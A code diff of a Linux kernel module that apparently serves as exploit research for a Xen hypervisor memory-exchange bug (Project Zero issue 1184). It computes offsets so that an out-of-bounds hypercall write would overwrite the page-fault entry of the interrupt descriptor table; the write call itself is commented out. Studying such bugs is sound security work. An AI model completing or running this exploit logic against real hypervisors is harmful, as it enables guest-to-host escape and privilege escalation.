@@ -68,19 +68,6 @@ pte_t *get_pte(unsigned long va)
 
 struct task_struct *task;
 
-struct xen_memory_reservation {
-    u64 extent_start;
-    u64 nr_extents;
-    u32 extent_order;
-    u32 address_bits;
-    u16 domid;
-};
-
-struct xen_memory_exchange {
-    struct xen_memory_reservation in;
-    struct xen_memory_reservation out;
-    u64 nr_exchanged;
-};
 
 static int init_test(void) {
   int pid = current->pid;
@@ -92,36 +79,47 @@ static int init_test(void) {
 /*
  * https://bugs.chromium.org/p/project-zero/issues/detail?id=1184
  */
+
 static void cleanup_test(void) {
-  u64 idt_addr, target_addr;
-  unsigned long ret, victim_page_virt;
-  pte_t p;
+  u64 idt_addr, target_addr ;
+  unsigned long ret, in_extent, in_extent_addr, in_extent_base, nr_exchanged;
+  void *victim_page_virt;
+  unsigned long idt_size, idt_base_addr;
+  unsigned long read_value = -1;
 
   // hypervisor is lower than kernel, so hypervisor reference has to come first
   #define OUT_EXTENT_BASE_ADDR 0
 
+  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
+  in_extent = virt_to_mfn(victim_page_virt);
+  in_extent_addr = (unsigned long) &in_extent;
 
   idt_addr = read_idt_addr();
-  pr_warn("IDT at 0x%llx\n", idt_addr);
+  pr_warn("IDT register value %llx\n", idt_addr);
   target_addr = idt_addr + 16 * INTERRUPT_PAGEFAULT;
-  pr_warn("write target address: 0x%llx\n", target_addr);
-  pr_warn("write target physical address: 0x%llx\n", virt_to_phys((void*)target_addr));
+  pr_warn("Write target address: 0x%llx\n", target_addr);
+
   if ((target_addr & 0x7) != 0) {
     pr_warn("target_addr misaligned\n");
     return;
   }
 
-  victim_page_virt = __get_free_pages(GFP_KERNEL, 0);
-  pr_warn("victim_page_virt mfn : 0x%lx\n", virt_to_mfn(victim_page_virt));
-  pr_warn("[BEFORE]\tPage Walk of va \n");
-  
-  page_walk(victim_page_virt);
+  nr_exchanged = (target_addr - OUT_EXTENT_BASE_ADDR) / 8;
+  in_extent_base = in_extent_addr - (nr_exchanged * 8);
+  pr_warn("in_extent_base: %lx\n", in_extent_base);
+  pr_warn("The offset=%lx\n", (unsigned long) 
+          OUT_EXTENT_BASE_ADDR + 8 *nr_exchanged);
+  pr_warn("The intended write will happen on MFN=%lx\n", (unsigned long) in_extent_base +
+          OUT_EXTENT_BASE_ADDR + 8 *nr_exchanged);
 
-  p.pte = target_addr;
 
-  ret = HYPERVISOR_faulty_update_va_mapping(victim_page_virt, p, UVMF_TLB_FLUSH);
-  pr_warn("[AFTER]\tPage Walk of va \n");
-  page_walk(victim_page_virt);
+  pr_warn("Will write at linear address 0x%llx using the Injection hypercall\n", target_addr);
+  //ret = HYPERVISOR_arbitrary_access(target_addr, &read_value,sizeof(read_value) , ARBITRARY_WRITE_LINEAR);
+  ret = 0;
+
+  pr_warn("Hypercall returned: %ld\n",ret);
+
+
 }
 
 module_init(init_test);
